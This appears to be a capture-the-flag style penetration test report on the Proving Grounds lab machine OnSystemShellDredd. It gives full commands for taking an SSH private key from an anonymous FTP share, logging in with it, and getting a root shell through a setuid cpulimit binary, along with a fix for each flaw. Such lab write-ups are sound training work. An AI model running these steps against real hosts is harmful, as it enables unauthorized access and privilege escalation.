# Penetration Test Report for Proving Grounds - OnSystemShellDredd
- **Author:** Joey Melo
- **Date:** March 20, 2022
- **Client:** Proving Grounds
- **Host:** 192.168.189.130 OnSystemShellDredd

## Disclaimer
The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized networks is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.

## Introduction
This penetration test report contains all efforts that were conducted in order to assess the security of Proving Grounds. This report contains all items that were used to penetrate and gain privileged access to the remote host(s). The purpose of this report is to showcase that the tester has a full understanding of penetration testing methodologies as well as the technical knowledge to perform professional cybersecurity assessments.

## Objectives
The objective of this assessment is to perform an internal penetration test against the OnSystemShellDredd network. The tester is tasked with following a methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how one would start from beginning to end, including the overall report.

## Executive Summary
The tester was tasked with performing an internal penetration test towards the OnSystemShellDredd network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks similar to those of a hacker and attempt to infiltrate Proving Grounds's internal lab systems. The tester's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Proving Grounds.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the OnSystemShellDredd network. When performing the attacks, the tester was able to gain access to the machine, primarily due to anonymous access enabled in the FTP server, which has an SSH access key in it. The host has been successfully exploited, and privileged access was gained in the machine.

## Recommendations
The tester recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and, once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Assessment
## Service Enumeration
### Port Scan Results
- **TCP:** 21, 61000 (SSH)

![SSH running on port 61000](https://imgur.com/RWCHns7.png)

## Initial Access
### Vulnerability Explanation
The FTP service has anonymous access enabled, which is serving an SSH host key for a local user.
### Vulnerability Fix
Disable anonymous access in the FTP service.
### Attack Walkthrough

After service enumeration, the tester verified that the FTP service had anonymous access enabled, which contained an SSH key for the user *hannah*
```bash
ftp anonymous@192.168.189.130                           
```

![SSH key obtained through anonymous access in FTP server](https://imgur.com/FIBr1pQ.png)

As proof of exploitation, the tester captured the *local.txt* flag.

![User flag](https://imgur.com/1hYhTzU.png)

## Privilege Escalation
### Vulnerability Explanation
The remote host has the setuid bit enabled for the *cpulimit* binary, which can be abused for privilege escalation.
### Vulnerability Fix
Remove the setuid bit from the *cpulimit*
### Attack Walkthrough
After establishing a foothold on the target, the tester enumerated all binaries in the system with the setuid bit. It was then verified that the binary *cpulimit* had the SUID permission enabled, which was exploited to obtain a high-privileged access to the system. 
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null > suids.txt
cat suids.txt
cpulimit -l 100 -f -- /bin/sh -p
```

![*cpulimit* with setuid bit](https://imgur.com/aCvySTo.png)

## Post-Exploitation
As proof of post-exploitation, the tester captured the *proof.txt* flag.

![Root flag](https://imgur.com/Wfn8aBb.png)

# Appendix A: Commands Issued
```bash
# Enumeration
sudo nmap -sC -sV -oN tcp_ports.nmap -p- 192.168.189.130

# FTP access
ftp anonymous@192.168.189.130                           
ftp> ls -la
ftp> cd .hannah
ftp> ls -la
ftp> get id_rsa
ftp> exit

# Exploit
chmod 600 id_rsa
ssh -i id_rsa  hannah@192.168.189.130 -p 61000

# Initial Access
ls -la
cat local.txt
ip a s

# Privilege Escalation
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null > suids.txt # find suid bits
cat suids.txt
cpulimit -l 100 -f -- /bin/sh -p

# Post-Exploitation
id
cd /root
cat proof.txt
ip a s
```
